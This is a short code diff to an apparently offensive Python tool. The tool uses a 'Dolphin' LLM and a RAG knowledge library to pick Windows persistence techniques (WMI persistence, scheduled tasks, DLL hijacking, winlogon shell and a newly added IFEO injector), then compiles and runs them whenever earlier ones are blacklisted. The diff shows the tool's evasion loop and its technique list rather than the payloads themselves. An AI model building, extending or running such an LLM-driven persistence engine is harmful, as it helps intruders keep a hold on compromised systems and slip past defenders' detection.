@@ -64,7 +64,8 @@ def check_health(technique_file):
         "admin_wmi_persistence.cpp": "admin_wmi_persistence",
         "scheduled_task.cpp": "scheduled_task",
         "dll_hijack_iexplore.cpp": "dll_hijack_iexplore",
-        "winlogon_shell.cpp": "winlogon_shell"
+        "winlogon_shell.cpp": "winlogon_shell",
+        "ifeo_injector.cpp": "ifeo_injector"
     }
     
     # Fallback to the base filename without extension if not in mapping
@@ -104,11 +105,14 @@ def main_loop():
             print("[*] Accessing Knowledge Library via RAG...")
             json_prompt = get_survival_strategy(ACTIVE_TECHNIQUE, BLACKLIST)
             
+            
             # 3. Brain Phase: Consult Dolphin
+            print("[*] Consulting the Dolphin LLM for a survival strategy...")
             new_technique = ask_dolphin_for_strategy(json_prompt)
             
             if new_technique:
                 # 4. Deployment Phase: Compile and Run (Requirement C)
+                print("[*] Deploying new technique...")
                 success = compile_and_run(new_technique)
                 if success:
                     ACTIVE_TECHNIQUE = new_technique
